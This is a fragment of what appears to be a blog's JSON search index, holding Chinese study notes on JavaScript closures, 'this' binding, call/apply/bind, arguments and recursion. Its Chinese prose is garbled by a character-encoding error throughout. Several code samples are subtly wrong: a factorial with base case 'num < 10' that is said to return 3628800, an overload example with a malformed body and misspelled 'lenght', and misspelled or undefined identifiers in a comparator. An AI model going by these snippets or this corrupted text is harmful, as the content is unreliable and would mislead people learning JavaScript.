func()ã€‚åªè¦å¤–éƒ¨ä½¿ç”¨ä¸åœæ­¢ï¼Œå‡½æ•°å°±ä¸ä¼šè¢«å›æ”¶    å¤–éƒ¨å˜é‡aé‡å¤è°ƒç”¨æ—¶ï¼Œå‡½æ•°å˜é‡å†…éƒ¨å˜é‡å€¼ä¸å˜ï¼Œåœ¨åŸæœ‰çš„åŸºç¡€ä¸Šç»§ç»­è¿›è¡Œå¤„ç†ï¼›è€Œä¸æ˜¯é‡æ–°å¼€å§‹    ä½¿ç”¨å¦ä¸€ä¸ªå¤–éƒ¨å˜é‡è°ƒç”¨å‡½æ•°ï¼Œåˆä¼šé‡æ–°åœ¨å†…å­˜ç©ºé—´å¼€è¾Ÿæ–°åœ°å€ï¼Œæ‰€æœ‰å˜é‡åˆå§‹åŒ–ï¼ˆå‡½æ•°è°ƒç”¨å¼€è¾Ÿæ–°å¼€æœºï¼‰ï¼›æ­¤å˜é‡ä¹‹åçš„é‡å¤ä½¿ç”¨ï¼Œåœ¨åŸæœ‰çš„åŸºç¡€ä¸Šç»§ç»­å¤„ç†ï¼ˆå˜é‡ä¿å­˜å‡½æ•°ç©ºé—´çš„åœ°å€ï¼‰        æ„é€ å‡½æ•°ï¼Œé»˜è®¤è¿”å›å¼•ç”¨ï¼›æ¯ä¸ªå®ä¾‹ä¸€ä¸ªå†…å­˜ç©ºé—´  ä»€ä¹ˆæ˜¯é—­åŒ…é—­åŒ…ï¼ˆClosureï¼‰ï¼šæŒ‡ä¸€ä¸ªå‡½æ•°å¯ä»¥è®¿é—®åˆ°å…¶å¤–å±‚å‡½æ•°ä¸­çš„æ•°æ®ï¼ˆä½œç”¨åŸŸï¼‰â€”â€” é—­åŒ…æ˜¯å‡½æ•°ä½œç”¨ï¼š  å»¶é•¿å˜é‡çš„ç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€å˜é‡ä¸ä¼šè¢«å›æ”¶  åˆ›å»ºç§æœ‰å˜é‡ç©ºé—´ï¼šç§æœ‰å˜é‡ä¸ä¼šæ±¡æŸ“å…¨å±€å¼Šç«¯ï¼šé—­åŒ…ä¼šä¿ç•™åŒ…å«å®ƒä»¬å‡½æ•°çš„ä½œç”¨åŸŸï¼Œæ¯”å…¶ä»–å‡½æ•°æ›´å ç”¨å†…å­˜æš´éœ²ä¸€ä¸ªè®¿é—®å™¨ï¼Œè¿”å›å‡ºå»çš„å˜é‡å¯é€šè¿‡è¯¥å‡½æ•°é—´æ¥èŒƒå›´ï¼›åœ¨javascriptè¯­è¨€ä¸­ï¼Œå†…å±‚å‡½æ•°å¯ä»¥è®¿é—®åˆ°å¤–å±‚å‡½æ•°çš„æ•°æ®ï¼ˆå³ä½¿å¤–å±‚å‡½æ•°ä¸å†å­˜åœ¨å¼•ç”¨ï¼‰ï¼Œå³ä¸ºé—­åŒ…â€‹\tå†…éƒ¨å‡½æ•°æ°¸è¿œä¸èƒ½ç›´æ¥è®¿é—®åˆ°å¤–éƒ¨å‡½æ•° this å’Œ arguments è¿™ä¸¤ä¸ªå˜é‡ã€‚ç®­å¤´å‡½æ•°ä¸­çš„thiséä¸¥æ ¼æ¨¡å¼ä¸‹æ‰§è¡Œwindowï¼›ä¸¥æ ¼æ¨¡å¼ä¸‹å€¼ä¸ºundefinedã€‚æƒ³è¦è®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨ å˜é‡å­˜thisï¼Œå°†å…¶å¼•ç”¨ä¿å­˜åˆ°é—­åŒ…èƒ½å¤Ÿè®¿é—®å¾—åˆ°çš„å˜é‡ä¸­ã€‚window.getIdentity = \"the window\"let object = {    identity : \"the object\",    getIdentity(){        return function(){            this.identity;  // \"the window\" å†…éƒ¨å‡½æ•°æ— æ³•è®¿é—®å¤–éƒ¨å‡½æ•°çš„thisï¼Œå†…éƒ¨thisä¸å­˜åœ¨è¿™ä¸ªå˜é‡å¾€å…¨å±€æ‰¾        }    }}let object = {    identity : \"the object\",    getIdentity(){        let that = this;        return function(){            that.identity;  // that æ˜¯å¤–éƒ¨å‡½æ•°å˜é‡ï¼Œé—­åŒ…å¯ä»¥è®¿é—®åˆ°        }    }}â€‹\tå¯¹è±¡å†…éƒ¨ä½¿ç”¨äº†thislet object = {    identity : \"the object\",    getIdentity(){        return this.identity;  // å¯¹è±¡æ–¹æ³•å†…éƒ¨ç›´æ¥ä½¿ç”¨this    }}object.getIdentity(); // â€œthe object\"(object.getIdentity = object.getIdentity)(); // the window// æ‰§è¡Œäº†ä¸€æ¬¡èµ‹å€¼ï¼Œç„¶åå†è°ƒç”¨èµ‹å€¼åçš„ç»“æœï¼›è¡¨è¾¾å¼çš„å€¼æ˜¯å‡½æ•°æœ¬èº«(getIdentity())ï¼Œthiså€¼ä¸å†äºä»»ä½•å¯¹è±¡ç»‘å®šï¼Œè¿”å›å…¨å±€å˜é‡å†…å­˜æ³„æ¼â€‹\té—­åŒ…ä¸€ç›´æŒæœ‰å¯èƒ½å·²ç»é”€æ¯çš„å¤–éƒ¨å˜é‡ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ã€‚åŒ¿åé—­åŒ…å°†å¯èƒ½éš¾ä»¥æ¸…é™¤ã€‚function assignHandler(){\tlet ele = document.getElementById(\"elementId\");    ele.onclick = () =&gt; { console.log(ele.id); }}â€‹\tå†…éƒ¨å‡½æ•°å½¢æˆäº†ä¸€ä¸ªé—­åŒ…ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°ä¸€ç›´æŒæœ‰ç€ assignHandler ä¸­çš„æ´»åŠ¨å¯¹è±¡ï¼Œå³DOMå…ƒç´ çš„å¼•ç”¨ã€‚åªæœ‰åŒ¿åå‡½æ•°å­˜åœ¨ï¼Œeleçš„å¼•ç”¨æ•°å°±è‡³å°‘ä¸º1ï¼Œå†…å­˜æ°¸è¿œä¸ä¼šè¢«å›æ”¶ã€‚function assignHandler(){\tlet ele = document.getElementById(\"elementId\");    let id = ele.id    ele.onclick = () =&gt; { console.log(id); }    el}â€‹\t:one: æ¶ˆé™¤å¾ªç¯ä½¿ç”¨ï¼Œåªä¿å­˜å¤–éƒ¨å‡½æ•°å˜é‡ï¼Œè€Œä¸æ˜¯å¤–éƒ¨å‡½æ•°è·å–åˆ°çš„å…¶ä»–å…ƒç´ â€‹\t:two: é—­åŒ…ä¼šå¼•ç”¨å¤–éƒ¨å‡½æ•°çš„æ´»åŠ¨å¯¹è±¡ï¼Œå…¶ä¸­ä»ç„¶åŒ…å«DOMå…ƒç´ çš„å¼•ç”¨ï¼Œæ‰€ä»¥éœ€è¦æŠŠå¤–éƒ¨å¼•ç”¨è®¾ç½®ä¸ºnullâ€‹\tè‡³æ­¤ï¼Œé—­åŒ…ä¸å¤–éƒ¨å‡½æ•°è·å–çš„å…¶ä»–å…ƒç´ æ— å…³ã€‚"
  },
  
  {
    "title": "7. å‡½æ•°",
    "url": "/posts/7.%E5%87%BD%E6%95%B0/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-08-26 00:00:00 +0800",
    





    
    "snippet": "â€‹\tå‡½æ•°å­˜åœ¨æå‡çš„é—®é¢˜ï¼Œä¼˜å…ˆçº§æ¯”å˜é‡ä¼˜å…ˆçº§é«˜å®šä¹‰      å‡½æ•°è¡¨è¾¾å¼  â€” let fun = function() {}        æ„é€ å‡½æ•° â€”â€”  new Function() {}          å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²æ ¼å¼      æ‰€æœ‰å‡½æ•°éƒ½æ˜¯Functionçš„å®ä¾‹ã€ä¹Ÿæ˜¯å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰      new Function(â€œå‚æ•°1â€,â€å‚æ•°2â€,â€å‡½æ•°ä½“â€) ï¼Œæœ€åä¸€ä¸ªå‚æ•°ä½œä¸º...",
    "content": "â€‹\tå‡½æ•°å­˜åœ¨æå‡çš„é—®é¢˜ï¼Œä¼˜å…ˆçº§æ¯”å˜é‡ä¼˜å…ˆçº§é«˜å®šä¹‰      å‡½æ•°è¡¨è¾¾å¼  â€” let fun = function() {}        æ„é€ å‡½æ•° â€”â€”  new Function() {}          å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²æ ¼å¼      æ‰€æœ‰å‡½æ•°éƒ½æ˜¯Functionçš„å®ä¾‹ã€ä¹Ÿæ˜¯å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰      new Function(â€œå‚æ•°1â€,â€å‚æ•°2â€,â€å‡½æ•°ä½“â€) ï¼Œæœ€åä¸€ä¸ªå‚æ•°ä½œä¸ºå‡½æ•°ä½“      å‡½æ•°ä¼šè¢«è§£æä¸¤æ¬¡ï¼š        è§£æå™¨ç‡å…ˆè¯»å– å‡½æ•°å£°æ˜ï¼Œä½¿å…¶åœ¨æ‰§è¡Œä»»ä½•ä»£ç å‰å°±å¯ä»¥è¢«è®¿é—®ï¼›è€Œ å‡½æ•°è¡¨è¾¾å¼ å¿…é¡»ç­‰è§£æå™¨æ‰§è¡Œåˆ°å…¶æ‰€åœ¨çš„ä»£ç è¡Œï¼Œæ‰è¢«çœŸæ­£è§£é‡Š        ç®­å¤´å‡½æ•°  â€‹\tå‡½æ•°å£°æ˜æå‡ï¼šä½¿ç”¨å‡½æ•°å£°æ˜ï¼Œä¼šåœ¨ä»»ä½•ä»£ç æ‰§è¡Œä¹‹å‰å…ˆè¯»å–å¹¶æ·»åŠ åˆ°æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ã€‚â€‹\tå‡½æ•°è¡¨è¾¾å¼ç›¸å½“äºä½äºå˜é‡å£°æ˜ä¸­ï¼Œå¦‚æœæ˜¯constã€letå˜é‡ï¼Œåˆ™ä¸å­˜åœ¨å˜é‡/å‡½æ•°å£°æ˜æå‡é—®é¢˜ï¼›varå˜é‡ï¼Œåˆ™é¢ä¸´ä¸å‡½æ•°å£°æ˜ä¸€æ ·çš„æå‡é—®é¢˜ã€‚å‡½æ•°ç‰¹æ€§å‡½æ•°å  ä½¿ç”¨ä¸å¸¦æ‹¬å·çš„ å‡½æ•°ånameï¼Œè¡¨ç¤ºæŒ‡é’ˆï¼›å¸¦æ‹¬å·ä½¿ç”¨ å‡½æ•°åname()ï¼Œè¡¨ç¤ºè°ƒç”¨  å‡½æ•°å¯¹è±¡éƒ½ä¼šæš´éœ²ä¸€ä¸ªåªè¯»çš„ `name`å±æ€§ ï¼ŒåŒ…å«å…³äºå‡½æ•°çš„ä¿¡æ¯          (new Function()).name æ„é€ å‡½æ•°åˆ›å»ºçš„åŒ¿åå‡½æ•°ï¼Œå€¼ä¸ºanonymous      (()=&gt;{}).name åŒ¿åå‡½æ•°ï¼Œå€¼ä¸ºç©ºå­—ç¬¦ä¸²\"\"      å‡½æ•°æ˜¯ä¸€ä¸ª get set æˆ–è€… bind()å®ä¾‹åŒ–ï¼Œæ ‡è¯†ç¬¦ä¼šå­˜åœ¨ä¸€ä¸ªå‰ç¼€        ä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼ˆå¯æ”¹å˜æŒ‡å‘ï¼Œå¤šä¸ªå‡½æ•°åå¯èƒ½æŒ‡å‘åŒä¸€ä¸ªå‡½æ•°ï¼‰å‚æ•°â€‹\tå‡½æ•°çš„å‚æ•°åœ¨å†…éƒ¨è¡¨ç°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œï¼ˆéç®­å¤´å‡½æ•°ï¼‰å®šä¹‰å‡½æ•°æ—¶ï¼Œå¯ä»¥åœ¨å†…éƒ¨ä½¿ç”¨argumentså¯¹è±¡è®¿é—®ä¼ å…¥çš„å‚æ•°å€¼ã€‚  arguments â€” ç±»æ•°ç»„å¯¹è±¡      å§‹ç»ˆä¸å¯¹åº”çš„å‘½åå‚æ•°åŒæ­¥ï¼Œä½†ä¸å‚æ•°å­˜æ”¾åœ¨ä¸åŒçš„å†…å­˜ç©ºé—´ä¸­ã€‚        æ•°ç»„ï¼šåŒ…å«ä¼ å…¥ï¼ˆéå®šä¹‰æ—¶ï¼‰å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œå¯ä»¥ç”¨arguments.lenghtç¡®å®šå®å‚ä¸ªæ•°    - å¯¹è±¡ï¼šå…·æœ‰calleeï¼ˆæŒ‡é’ˆï¼‰å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªargumentså¯¹è±¡çš„å‡½æ•°ï¼Œarguments.callee.lenght ç¡®å®šå½¢å‚çš„ä¸ªæ•°  â€‹\tåœ¨é€’å½’å›è°ƒå‡½æ•°ä¸­ï¼Œå›è°ƒä¸­å†™ è‡ªèº«å‡½æ•°åï¼Œè‹¥ä¿®æ”¹å‡½æ•°åï¼Œåˆ™ä¼šå‡ºç°é—®é¢˜ï¼›æ”¹æˆarguments.calleeï¼Œé€‚ç”¨äº åŒ¿åå‡½æ•°å’Œé€’å½’è°ƒç”¨æ—¶ã€‚â€‹\tåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œ:one: å¯¹arguments[0]èµ‹å€¼ï¼Œä¸ä¼šå½±å“å‚æ•°ï¼› :two: åœ¨å‡½æ•°ä¸­é‡å†™argumentså¯¹è±¡ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ã€‚  é‡è½½ï¼šJavaScriptä¸å­˜åœ¨éªŒè¯å‘½åå‚æ•°çš„æœºåˆ¶ï¼Œä¸¤ä¸ªåŒåå‡½æ•°ä¼šè¦†ç›–å…ˆå®šä¹‰çš„ï¼Œä½†å¯ä»¥ä½¿ç”¨lenght æ ¹æ®ä¼ å…¥å‚æ•°çš„æ•°é‡ï¼Œå®ç°é‡è½½function hello(name,message)(\tif(arguments.length) return 'no one come in'\tif(arguments.length === 1) return \"this gus didn't say anything\"\tif(arguments.lenght === 2) return arguments[1])  å‡½æ•°åè§£è€¦function factorial(num){    if(num &lt; 10) return 1    return num * factorial(num - 1)}let a = factorial(10); // 3628800// ä¸ºå‡½æ•°ä½“ä¿å­˜å¤šä¸ªå‡½æ•°åï¼Œå¹¶å°† factorial å‡½æ•°åï¼ˆæŒ‡é’ˆï¼‰æŒ‡å‘ä¸ºç©ºlet newLocal = factorial;factorial = null;// å†æ¬¡è°ƒç”¨ å‡½æ•°ä½“ï¼Œå†…éƒ¨çš„factorial() = nullï¼Œå¯¼è‡´è®¡ç®—å¤±è´¥let b = factorial(10); // factorial is not a functionâ€‹\tå¯ä»¥ä½¿ç”¨arguments.calleeï¼š æŒ‡å‘argumentså¯¹è±¡æ‰€åœ¨å‡½æ•°çš„æŒ‡é’ˆfunction factorial(num){    if(num &lt; 10) return 1    return num * arguments.callee(num - 1)}  é»˜è®¤å‚æ•°å€¼ï¼ˆES6ï¼‰argumentsä¸åæ˜ é»˜è®¤å€¼ï¼Œåªåæ˜ ä¼ ç»™å‡½æ•°çš„å‚æ•°ï¼›ä¿®æ”¹å‘½åå‚æ•°ä¸ä¼šå½±å“argumentså¯¹è±¡ï¼Œä»¥è°ƒç”¨å‡½æ•°æ—¶ä¼ å…¥çš„å€¼ä¸ºå‡†ã€‚åªæœ‰åœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶ã€æœªä¼ å…¥ç›¸åº”å‚æ•°æ—¶ï¼Œé»˜è®¤å‚æ•°å€¼æ‰ä¼šè¢«æ±‚å€¼ï¼›ä½œç”¨åŸŸï¼šä½äºå‡½æ•°å­˜æ´»æ—¶é—´å†…ï¼Œå—çº§ä½œç”¨åŸŸï¼Œä¸”å‚æ•°æŒ‰å®šä¹‰çš„å…ˆåé¡ºåºåˆå§‹åŒ–function makeK (name = \"King\"){}function makek (name = \"King\", time = getTime(name)){}      callerå±æ€§ï¼ˆéæ ‡å‡†çš„ï¼‰    è°ƒç”¨å½“å‰å‡½æ•°çš„å¼•ç”¨ï¼Œå¦‚æœæ˜¯å…¨å±€è°ƒç”¨åˆ™ä¸ºnullã€‚    åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œè®¿é—®arguments.calleerä¼šæŠ¥é”™ï¼Œä¸”ä¸å¯ä»¥ç»™å‡½æ•°çš„caller`å±æ€§èµ‹å€¼ï¼Œå¦åˆ™ä¼šå¯¼è‡´é”™è¯¯  ä½œä¸ºå€¼â€‹\tè°ƒç”¨å‡½æ•°å¯¹è±¡ï¼ˆæ•°ç»„ï¼‰å†³å®šæ“ä½œçš„å¯¹è±¡ï¼Œfunction createComparisonFunction(propertyName){ \t// å¤–å±‚å‚æ•°`propertyName` æŒ‡å®šæ“ä½œçš„å±æ€§å€¼    return function(object1, object2){        let value1 = object1[properyName];        let value2 = object2[properyName];                        // å¯¹ value1 &amp; value2 æ“ä½œ \t\t\t\t\tå†…å±‚å‡½æ•°å†³å®šæ“ä½œå†…å®¹ã€‚    }}let arr = [    {name:\"zhang\",age:18},    {name:\"cheng\",age:20}]arr.sort(createComparisonFunction(age));\t// obj.sort éå†è°ƒç”¨æ•°ç»„å†…éƒ¨çš„å€¼thisæŒ‡å‘1. æ™®é€šå‡½æ•°ï¼š   - å®šä¹‰ `function fn() {}`   - è°ƒç”¨ `fn();`   `fn.call()`   - **this â†’ window**2. æ„é€ å‡½æ•°   - å®šä¹‰ï¼š`function Star() {}`   - è°ƒç”¨ï¼š `new Star();`   - **this â†’ å®ä¾‹å¯¹è±¡**ï¼ŒåŸå‹å¯¹è±¡é‡Œé¢çš„æ–¹æ³•ä¹Ÿæ˜¯3. å¯¹è±¡çš„æ–¹æ³•   - å®šä¹‰ï¼š `let o = { sayHi: function() {} }`   - è°ƒç”¨ï¼š`o.sayHi();`   - **this â†’ æ–¹æ³•æ‰€å±çš„å¯¹è±¡**4. ç»‘å®šäº‹ä»¶å‡½æ•°   - `btn.onclick = function() {};`   - **this â†’ ç»‘å®šäº‹ä»¶çš„å¯¹è±¡**5. å®šæ—¶å™¨å‡½æ•°   - window.`setInterval( function() {}, 1000)`  â€”â€” æ¯éš”1sè‡ªåŠ¨è°ƒç”¨ä¸€æ¬¡   - this â†’ window6. ç«‹å³æ‰§è¡Œå‡½æ•°   - `( function() {} )(ä¼ å…¥å‚æ•°)`   - this â†’ window7. ç®­å¤´å‡½æ•°   - å®šä¹‰ï¼š`let fn = ()=&gt;{}`   - **this â†’ ä¿ç•™å®šä¹‰æ—¶çš„this**æ¡ˆä¾‹ï¼šæ–°å¢æ•°ç»„æ–¹æ³•æ“ä½œå˜é‡å­˜thisâ€‹\tå£°æ˜æ—¶ï¼Œfunction User(name){this.name = name}ä¸ºç©ºå¯¹è±¡User{}ï¼›è¢«è°ƒç”¨æ—¶ï¼Œæ ¹æ®å‚æ•°ç”ŸæˆUser{name:\"å‚æ•°\"}â€‹\tæ‰€ä»¥thisæ˜¯å¯ä»¥è¢«æ”¹å˜çš„let Lesson = {\tsite:\"122\",    lists: [\"js\",\"css\",\"mysql\"],    show: function() {        const self = this; //æŒ‡å‘å¯¹è±¡        return this.lists.map(function(value){            console.log(this); //æŒ‡å‘window            console.log(value);//å½¢å‚            console.log(this.site);//æŒ‡å‘windowï¼Œundefined            console.log(self.site);//æŒ‡å‘å¯¹è±¡ï¼Œâ€122\"        })    }éƒ¨åˆ†å‡½æ•°å­˜åœ¨ç¬¬äºŒå‚æ•°å¯ä¼ é€’thisshow: function(){\treturn this.lists.map(function(){    \tconsole.log(this); //å¯¹è±¡    },this);  }new.targetâ€‹\tæ£€æµ‹å‡½æ•°æ˜¯å¦ä½¿ç”¨äº†newå…³é”®å­—è°ƒç”¨ã€‚â€‹\tå¦‚æœå‡½æ•°æ˜¯æ­£å¸¸è°ƒç”¨ï¼Œnew.target = undefinedï¼›å¦‚æœä½¿ç”¨newå…³é”®å­—è°ƒç”¨ï¼Œnew.targetæŒ‡å‘è¢«è°ƒç”¨çš„ æ„é€ å‡½æ•°ã€‚call &amp; applyâ€‹\tä»¥æŒ‡å®šçš„thisè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›å‡½æ•°çš„è¿”å›å€¼ï¼›æ›´æ¢å‡½æ•°è°ƒç”¨çš„ä½œç”¨åŸŸï¼›â€‹\tä¼ å…¥çš„æ•°ç»„å†…å…ƒç´ çš„ä¸ªæ•° &gt; å‡½æ•°å¯ä»¥æ¥å—çš„å‚æ•°ï¼Œæ•°ç»„å†…å¤šä½™çš„å°†è¢«ä¸¢å¼ƒï¼›â€‹\téä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œè°ƒç”¨æ—¶æ²¡æœ‰æŒ‡å®šthisï¼Œthis = windowï¼›â€‹\tåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œè°ƒç”¨æ—¶æ²¡æœ‰æŒ‡å®šthisï¼Œä¸ä¼šæŒ‡å‘windowè€Œæ˜¯ä¼šå˜æˆundefinedã€‚function fun(value1,value2,value3...)// call (this, å‚æ•°) å‚æ•°é—´ä½¿ç”¨é€—å·åˆ†éš”function callFun(value1, value2, value3 ...){    return fun.call(this, value1, value2, value3)}// apply (this, å‚æ•°æ•°ç»„)function applyFun(value1, value2, value3 ...){    return fun.apply(this, arguments); // ä¼ å…¥æ•°ç»„ã€ç±»æ•°ç»„    return fun.apply(this, [value1, value2, value3])}â€‹\tcall &amp; apply åŒºåˆ«åœ¨ä¸ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦ä¸ºæ•°ç»„ï¼›å¦‚ä½•é€‰ç”¨å®Œå…¨å–å†³äºæ€ä¹ˆè°ƒç”¨å‡½æ•°ä¼ å‚æ–¹ä¾¿ï¼šâ€‹\tapply()æ•°ç»„å‚æ•°ä¼ å…¥å‡½æ•°å†…éƒ¨ç›´æ¥å±•å¼€ï¼›call()ä»ä»¥æ•°ç»„å½¢å¼ä¼ å…¥ï¼›å¦‚æœä¸éœ€è¦å‚æ•°ï¼Œä¸¤è€…éƒ½ä¸€æ ·ã€‚åº”ç”¨1ï¼šé¿å…æ±‚å€¼éå†â€‹\tMath.max.apply(null, arr); === Math.max(...arr);åº”ç”¨2ï¼šcallå’Œapplyæ–¹æ³•å®ç°å°è£…æ¥å£bind()â€‹\tè°ƒç”¨bindåæ­¤å‡½æ•°åä¸ä¼šç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯å¾—åˆ°ä¸€ä¸ªæ–°çš„å‡½æ•°ã€å®ä¾‹ï¼ˆä¸åŒå†…å­˜åœ°å€ï¼‰â€‹\tshow.bind({name: \"\"})()å¯ä½¿å…¶ç«‹å³æ‰§è¡Œâ€‹\tä¼ é€’å‚æ•°çš„æ–¹æ³•ï¼šï¼ˆä¸æ˜¯ç«‹å³æ‰§è¡Œï¼‰â€‹\tç»‘å®šæ—¶ä¼ å‚ï¼ˆå·²å°†å…¨éƒ¨å‚æ•°èµ‹å€¼ï¼Œè°ƒç”¨æ—¶ä¼ å‚æ— æ•ˆï¼‰â€‹\tè°ƒç”¨æ—¶ä¼ å‚ï¼ˆå‚æ•°å¡«å……å®Œï¼Œå‰©ä½™å‚æ•°æ— ç”¨ï¼‰// ä¸è°ƒç”¨å‡½æ•°ï¼Œä½†æ”¹å˜thisçš„æŒ‡å‘åŸå‡½æ•°çš„æ‹·è´ = fun.bind( æŒ‡å®šçš„this, value1ï¼Œvalue2 ...){}      ä¸»è¦åº”ç”¨ï¼š                  åå‡½æ•°ï¼Œä½¿ç»‘å®šçš„å‡½æ•°æ‹¥æœ‰é¢„è®¾çš„åˆå§‹å‚æ•°ï¼ˆåŒ…æ‹¬thiså€¼ï¼Œé¢„è®¾çš„å‚æ•°ï¼‰ï¼Œè°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°ä¼šè·Ÿåœ¨å®ƒä»¬åé¢            å¿«æ·è°ƒç”¨      é…åˆå®šæ—¶å™¨      let o = { name: 'baby' } // è°ƒç”¨çš„å¯¹è±¡function fn(arr1,arr2,arr3) {    console.log(this.name);  // baby    console.log(arr1,arr2,arr3);}let bindFun = fn.bind(o,1,3); // arr1 = 1ï¼Œarr2 = 2ï¼Œ arr3 = undefined ï¼ŒthisæŒ‡å‘oï¼Œ ä½†æ²¡æœ‰è°ƒç”¨bindFun(0); // arr3 = 0let btn = document.querSelector('button');btn.onclick = function() {    this.disabled = true;  // å‡½æ•°å†…çš„thisæŒ‡å‘è°ƒç”¨è€…    // bind è§£å†³    setTimeout( function(){        // this.disabled = false;     å®šæ—¶å™¨å†…çš„thisæŒ‡å‘windowï¼Œæ²¡æœ‰è¿™ä¸ªå±æ€§    }.bind(this),3000) //ä¸ºå®šæ—¶å™¨çš„å‡½æ•°å¤–é¢ï¼ˆæ­¤æ—¶çš„thisä»ç„¶æ—¶å‡½æ•°çš„è°ƒç”¨è€…ï¼‰ç»‘å®šthisï¼Œä¹‹åå†…éƒ¨çš„thisæŒ‡å‘å‡½æ•°çš„è°ƒç”¨è€…    // ç®­å¤´å‡½æ•° è§£å†³    setTimeout= ()=&gt;{        this.disabled = false;     //ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„thisï¼Œè¿™ä¸ªthisæŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨è€…    },3000)}é€’å½’å‡½æ•°â€‹\tå®šä¹‰ï¼šå‡½æ•°å†…éƒ¨è°ƒç”¨è‡ªå·±â€‹\tæ ˆæº¢å‡ºï¼ˆstack overflowï¼‰ï¼Œæ­»å¾ªç¯ â€”â€” é€€å‡ºæ¡ä»¶éå¸¸é‡è¦      è§£å†³é—®é¢˜ â€”â€” é€’å½’å‡½æ•°æ¡ˆä¾‹                  æ±‚1-nçš„é˜¶ä¹˜        å‡½æ•°å†…éƒ¨ä½¿ç”¨äº† å‡½æ•°åè°ƒç”¨ï¼Œå¯¼è‡´æ‰§è¡Œé€»è¾‘ä¸å‡½æ•°åè€¦åˆï¼Œåº”è¯¥æ›¿æ¢ä¸ºarguments.callee()              function fn(n) {    if (n == 1) { return 1; }    if (n &gt;= 0) {         return n * fn(n - 1);         // return n * arguments.callee(n - 1)    }    else        alert(\"è¯·è¾“å…¥å¤§äºç­‰äº1çš„æ•°\");}console.log(fn(-3));                      æ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—  $a_n = a_{n-1} + a_{n-2}(a_1 = 1,a_2 = 1,nâ‰¥3)$        å°¾è°ƒç”¨ä¼˜åŒ–ï¼šå¦‚æœå‡½æ•°é€»è¾‘å…è®¸åŸºäºå°¾è°ƒç”¨å°†å…¶é”€æ¯ï¼Œåˆ™å¼•æ“ä¼šè¿™ä¹ˆåšï¼ˆES6ç‰¹æ€§ï¼‰              function fb(n) {    console.log(n);    if (n === 1 || n === 2) { return 1; }    else         return fb(n - 1) + fb(n - 2);}console.log(fb(3));  // ä¼˜åŒ–åï¼šfunction fib(n){\treturn fibImpl(0, 1, n);}function fibImpl(a, b, n){    if(n === 0) return a;    return fibImpl(b, a+b, n-1);}      å°¾è°ƒç”¨ä¼˜åŒ–çš„æ¡ä»¶ï¼š  ä»£ç åœ¨ä¸¥æ ¼æ¡ä»¶ä¸‹ â€”â€” éä¸¥æ ¼æ¨¡å¼ä¸‹å‡½æ•°è°ƒç”¨ä¸­å…è®¸ä½¿ç”¨f.arguments å’Œ f.callerï¼Œéƒ½ä¼šå¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å †æ ˆ  å¤–éƒ¨å‡½æ•°ï¼ˆfibï¼‰çš„è¿”å›å€¼æ˜¯å¯¹å°¾è°ƒç”¨å‡½æ•°ï¼ˆfibImplï¼‰çš„è°ƒç”¨  â€”â€” ä¸Šä¸‹æ–‡ä¸å†è¿”å›å¤–éƒ¨å‡½æ•°ï¼ˆfibï¼‰ä¸­  å°¾è°ƒç”¨å‡½æ•°ï¼ˆfibImplï¼‰è¿”å›åä¸éœ€è¦æ‰§è¡Œé¢å¤–çš„æ“ä½œ â€”â€” ä¸Šä¸‹æ–‡ä¸å†è¿”å›å¤–éƒ¨å‡½æ•°ï¼ˆfibï¼‰ä¸­  å°¾è°ƒå‡½æ•°ï¼ˆfibImplï¼‰ä¸æ˜¯å¼•ç”¨å¤–éƒ¨å‡½æ•°ä½œç”¨åŸŸä¸­è‡ªç”±å˜é‡çš„é—­åŒ… â€”â€” å¤–éƒ¨å‡½æ•°ï¼ˆfibï¼‰ä¸Šä¸‹æ–‡ä»æœ‰å­˜åœ¨çš„å¿…è¦å…¨å±€å‡½æ•°function screenX(){}é»˜è®¤å‹å…¥windowä¸­ï¼Œå¯èƒ½è¦†ç›–windowä¸­å£°æ˜çš„å±æ€§/å˜é‡ï¼Œå‡½æ•°æå‡çš„é—®é¢˜å°†å‡½æ•°èµ‹å€¼ç»™letå˜é‡å¯ä»¥é¿å…ä»¥ä¸Šé—®é¢˜å‡½æ•°ç”¨ç±»çš„æ–¹æ³•å£°æ˜ï¼ˆes6ï¼‰class a {}â‰ï¸é«˜é˜¶å‡½æ•°  å¯¹å…¶ä»–å‡½æ•°è¿›è¡Œæ“ä½œï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªï¼‰          æ¥å—å‡½æ•°ä½œä¸ºå‚æ•°      å°†å‡½æ•°ä½œä¸ºè¿”å›å€¼è¾“å‡º      // æ¥å—å‡½æ•°ä½œä¸ºå‚æ•°function fn(callback){ callback &amp;&amp; callback(); }fn(function() { alert('hi'); })// å°†å‡½æ•°ä½œä¸ºè¿”å›å€¼è¾“å‡ºfunction fn(){ return function() {} }// å›è°ƒå‡½æ•°ç«‹å³æ‰§è¡Œå‡½æ•° ï¼ˆIIFEï¼‰â€‹\tImmediately Invoked Function 